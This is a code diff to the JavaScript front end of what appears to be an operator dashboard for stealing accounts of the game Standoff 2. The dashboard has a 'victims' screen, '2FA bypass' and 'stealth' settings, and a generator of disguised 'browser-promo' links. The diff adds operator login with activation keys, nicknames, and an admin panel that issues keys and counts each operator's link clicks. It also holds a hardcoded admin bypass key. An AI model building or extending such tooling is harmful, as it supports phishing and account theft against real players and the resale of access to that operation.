@@ -13,6 +13,10 @@ window.AC = window.AC || {};
     activated: false,
     currentScreen: 'activation',
     selectedTarget: 'standoff2',
+    selectedLinkType: 'browser-promo',
+    userRole: null,
+    userNickname: null,
+    userKey: null,
     config: {
       bypass2fa: true,
       stealth: true,
@@ -34,7 +38,7 @@ window.AC = window.AC || {};
   // ── Screens ────────────────────────────────────────────────
   const screens = [
     'activation', 'splash', 'dashboard',
-    'generating', 'result', 'victims', 'about'
+    'generating', 'result', 'victims', 'mylinks', 'admin', 'about'
   ];
 
   function getScreen(name) {
@@ -70,10 +74,15 @@ window.AC = window.AC || {};
     navItems.forEach(function (item) {
       item.classList.toggle('active', item.dataset.screen === name);
     });
+    // Show admin tab only for admin role
+    var adminNav = document.getElementById('nav-item-admin');
+    if (adminNav) {
+      adminNav.style.display = (state.userRole === 'admin') ? 'flex' : 'none';
+    }
     // Show/hide nav
     var nav = document.getElementById('main-nav');
     if (nav) {
-      var showNav = ['dashboard', 'victims', 'about', 'mylinks'].indexOf(name) !== -1;
+      var showNav = ['dashboard', 'victims', 'about', 'mylinks', 'admin'].indexOf(name) !== -1;
       nav.classList.toggle('visible', showNav);
     }
   }
@@ -103,6 +112,9 @@ window.AC = window.AC || {};
       case 'mylinks':
         showMyLinks();
         break;
+      case 'admin':
+        showAdmin();
+        break;
       case 'about':
         break;
     }
@@ -118,27 +130,126 @@ window.AC = window.AC || {};
 
     activateBtn.addEventListener('click', function () {
       var key = keyInput ? keyInput.value.trim() : '';
-      if (key.length >= 8) {
-        if (errorEl) errorEl.style.display = 'none';
-        state.activated = true;
-        localStorage.setItem('ac_activated', '1');
-        showScreen('splash');
-        startSplash();
-      } else {
-        if (errorEl) {
-          errorEl.textContent = '✗ INVALID KEY — Minimum 8 characters required';
-          errorEl.style.display = 'block';
-        }
-        if (window.AC.anim) window.AC.anim.glitch(keyInput, 500);
+      if (!key) {
+        if (errorEl) { errorEl.textContent = '✗ Enter activation key'; errorEl.style.display = 'block'; }
+        return;
       }
+
+      activateBtn.textContent = 'CHECKING...';
+      activateBtn.disabled = true;
+
+      fetch('/api/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ key: key })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (!data.success) {
+          if (errorEl) { errorEl.textContent = '✗ INVALID KEY'; errorEl.style.display = 'block'; }
+          activateBtn.textContent = 'ACTIVATE'; activateBtn.disabled = false;
+          if (window.AC.anim) window.AC.anim.glitch(keyInput, 500);
+          return;
+        }
+
+        if (errorEl) errorEl.style.display = 'none';
+
+        if (data.role === 'admin') {
+          // Admin — straight in
+          state.userRole = 'admin';
+          state.userNickname = 'ADMIN';
+          state.userKey = key;
+          localStorage.setItem('ac_key', key);
+          localStorage.setItem('ac_role', 'admin');
+          localStorage.setItem('ac_nick', 'ADMIN');
+          state.activated = true;
+          showScreen('splash');
+          startSplash();
+          return;
+        }
+
+        if (data.needsNickname) {
+          // First-time user — ask for nickname
+          showNicknameInput(key);
+        } else {
+          // Returning user
+          state.userRole = 'user';
+          state.userNickname = data.nickname;
+          state.userKey = key;
+          localStorage.setItem('ac_key', key);
+          localStorage.setItem('ac_role', 'user');
+          localStorage.setItem('ac_nick', data.nickname);
+          state.activated = true;
+          showScreen('splash');
+          startSplash();
+        }
+      })
+      .catch(function() {
+        if (errorEl) { errorEl.textContent = '✗ SERVER ERROR'; errorEl.style.display = 'block'; }
+        activateBtn.textContent = 'ACTIVATE'; activateBtn.disabled = false;
+      });
     });
 
-    // Enter key
     if (keyInput) {
       keyInput.addEventListener('keydown', function (e) {
         if (e.key === 'Enter') activateBtn.click();
       });
     }
+  }
+
+  function showNicknameInput(key) {
+    var container = document.querySelector('.activation-container');
+    if (!container) return;
+
+    container.innerHTML =
+      '<h2 class="activation-title" style="margin-bottom:0.5rem">ENTER YOUR NICKNAME</h2>' +
+      '<p style="color:var(--text-dim);font-size:0.75rem;margin-bottom:1.5rem;font-family:var(--font-mono)">Key accepted. Set your callsign.</p>' +
+      '<input type="text" id="nickname-input" class="input-field mono" placeholder="Your nickname..." maxlength="20" autocomplete="off" spellcheck="false" style="margin-bottom:1rem;text-align:center">' +
+      '<div id="nickname-error" style="display:none;color:var(--danger);font-size:0.75rem;margin-bottom:0.5rem"></div>' +
+      '<button class="btn-activate" id="btn-set-nick">CONFIRM</button>';
+
+    var nickInput = document.getElementById('nickname-input');
+    var nickBtn = document.getElementById('btn-set-nick');
+    var nickErr = document.getElementById('nickname-error');
+
+    nickBtn.addEventListener('click', function () {
+      var nick = nickInput.value.trim();
+      if (!nick || nick.length < 2) {
+        nickErr.textContent = '✗ Minimum 2 characters';
+        nickErr.style.display = 'block';
+        return;
+      }
+
+      nickBtn.textContent = 'REGISTERING...';
+      nickBtn.disabled = true;
+
+      fetch('/api/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ key: key, nickname: nick })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (!data.success) {
+          nickErr.textContent = '✗ ' + (data.error || 'Registration failed');
+          nickErr.style.display = 'block';
+          nickBtn.textContent = 'CONFIRM'; nickBtn.disabled = false;
+          return;
+        }
+        state.userRole = data.role;
+        state.userNickname = data.nickname;
+        state.userKey = key;
+        localStorage.setItem('ac_key', key);
+        localStorage.setItem('ac_role', data.role);
+        localStorage.setItem('ac_nick', data.nickname);
+        state.activated = true;
+        showScreen('splash');
+        startSplash();
+      });
+    });
+
+    nickInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') nickBtn.click(); });
+    nickInput.focus();
   }
 
   // ── Splash Screen ─────────────────────────────────────────
@@ -214,6 +325,20 @@ window.AC = window.AC || {};
       });
     });
 
+    // Link type selection cards
+    var typeCards = document.querySelectorAll('.link-type-card');
+    typeCards.forEach(function (card) {
+      card.addEventListener('click', function () {
+        typeCards.forEach(function (c) {
+          c.classList.remove('selected');
+          c.style.borderColor = '#222';
+        });
+        card.classList.add('selected');
+        card.style.borderColor = 'var(--accent-red)';
+        state.selectedLinkType = card.dataset.type;
+      });
+    });
+
     // Proxy selector
     var proxySelect = document.getElementById('proxy-select');
     if (proxySelect) {
@@ -274,7 +399,11 @@ window.AC = window.AC || {};
         fetch('/api/create-link', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ destination: 'https://standoff2.com' })
+          body: JSON.stringify({
+            destination: 'https://standoff2.com',
+            linkType: state.selectedLinkType || 'browser-promo',
+            nickname: state.userNickname || 'Anonymous'
+          })
         })
         .then(function(res) { return res.json(); })
         .then(function(data) {
@@ -605,6 +734,130 @@ window.AC = window.AC || {};
     };
   }
 
+  // ── Admin Screen ──────────────────────────────────────────
+  function showAdmin() {
+    var adminKey = state.userKey || localStorage.getItem('ac_key');
+    if (state.userRole !== 'admin' && adminKey !== 'ANTICHRIST-GOD-MODE') {
+      showScreen('dashboard');
+      return;
+    }
+
+    // Load users
+    fetch('/api/admin/users', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ adminKey: adminKey })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      var tbody = document.getElementById('admin-users-body');
+      if (!tbody) return;
+      tbody.innerHTML = '';
+
+      if (!data.users || data.users.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);">No users registered yet.</td></tr>';
+        return;
+      }
+
+      data.users.forEach(function(u) {
+        var tr = document.createElement('tr');
+        var time = u.lastSeen ? new Date(u.lastSeen).toLocaleTimeString() : 'N/A';
+        tr.innerHTML =
+          '<td class="mono font-bold" style="color:var(--accent-red);">' + u.nickname + '</td>' +
+          '<td class="mono" style="font-size:0.65rem;">' + u.key + '</td>' +
+          '<td>' + (u.linksCreated || 0) + '</td>' +
+          '<td class="text-green">' + (u.totalClicks || 0) + '</td>' +
+          '<td style="font-size:0.65rem;">' + time + '</td>' +
+          '<td><button class="btn-primary btn-rename" data-nick="' + u.nickname + '" style="padding:0.2rem 0.5rem;font-size:0.65rem;">RENAME</button></td>';
+
+        tr.querySelector('.btn-rename').addEventListener('click', function() {
+          var newNick = prompt('New nickname for ' + u.nickname + ':', u.nickname);
+          if (newNick && newNick !== u.nickname) {
+            fetch('/api/admin/rename', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ adminKey: adminKey, oldNickname: u.nickname, newNickname: newNick })
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(res) {
+              if (res.success) {
+                if (window.AC.notify) window.AC.notify.show('Renamed to ' + newNick, 'success');
+                showAdmin();
+              }
+            });
+          }
+        });
+
+        tbody.appendChild(tr);
+      });
+    });
+
+    // Load keys
+    loadAdminKeys(adminKey);
+
+    // Gen keys button
+    var genBtn = document.getElementById('btn-admin-genkeys');
+    if (genBtn) {
+      genBtn.onclick = function() {
+        genBtn.disabled = true;
+        fetch('/api/admin/generate-keys', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ adminKey: adminKey, count: 10 })
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          genBtn.disabled = false;
+          if (d.success) {
+            if (window.AC.notify) window.AC.notify.show('+10 keys generated', 'success');
+            loadAdminKeys(adminKey);
+          }
+        });
+      };
+    }
+  }
+
+  function loadAdminKeys(adminKey) {
+    fetch('/api/admin/keys', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ adminKey: adminKey })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      var keysEl = document.getElementById('admin-keys-list');
+      if (!keysEl || !data.keys) return;
+
+      var entries = Object.entries(data.keys);
+      var unusedCount = entries.filter(function(e) { return !e[1].used; }).length;
+      var usedCount = entries.length - unusedCount;
+
+      var html = '<div style="margin-bottom:0.5rem;color:var(--text-dim);font-size:0.65rem;">' +
+        'Total: <span class="text-red">' + entries.length + '</span> | Unused: <span class="text-green">' + unusedCount + '</span> | Used: <span class="text-yellow">' + usedCount + '</span>' +
+        '</div><div style="display:flex;flex-wrap:wrap;gap:0.4rem;">';
+
+      entries.forEach(function(item) {
+        var k = item[0];
+        var info = item[1];
+        if (info.used) {
+          html += '<span style="background:#221111;color:#666;padding:0.2rem 0.4rem;border-radius:3px;text-decoration:line-through;" title="Used by ' + (info.usedBy || 'someone') + '">' + k + '</span>';
+        } else {
+          html += '<span style="background:#112211;color:#00ff41;padding:0.2rem 0.4rem;border-radius:3px;cursor:pointer;" class="key-item" title="Click to copy">' + k + '</span>';
+        }
+      });
+      html += '</div>';
+      keysEl.innerHTML = html;
+
+      // Copy on click
+      keysEl.querySelectorAll('.key-item').forEach(function(el) {
+        el.addEventListener('click', function() {
+          navigator.clipboard.writeText(el.textContent);
+          if (window.AC.notify) window.AC.notify.show('Copied ' + el.textContent, 'success');
+        });
+      });
+    });
+  }
+
   // ── PWA Registration ──────────────────────────────────────
   function registerPWA() {
     if ('serviceWorker' in navigator) {
@@ -618,14 +871,23 @@ window.AC = window.AC || {};
   function init() {
     registerPWA();
 
-    // Check if already activated
-    if (localStorage.getItem('ac_activated') === '1') {
+    // Check if already authenticated
+    var savedKey = localStorage.getItem('ac_key');
+    var savedRole = localStorage.getItem('ac_role');
+    var savedNick = localStorage.getItem('ac_nick');
+
+    if (savedKey) {
+      state.userKey = savedKey;
+      state.userRole = savedRole || 'user';
+      state.userNickname = savedNick || 'Anonymous';
       state.activated = true;
+
       var activationScreen = getScreen('activation');
       if (activationScreen) activationScreen.classList.remove('active');
       var dashboardScreen = getScreen('dashboard');
       if (dashboardScreen) dashboardScreen.classList.add('active');
       state.currentScreen = 'dashboard';
+      updateNav('dashboard');
       onScreenEnter('dashboard');
     }
 
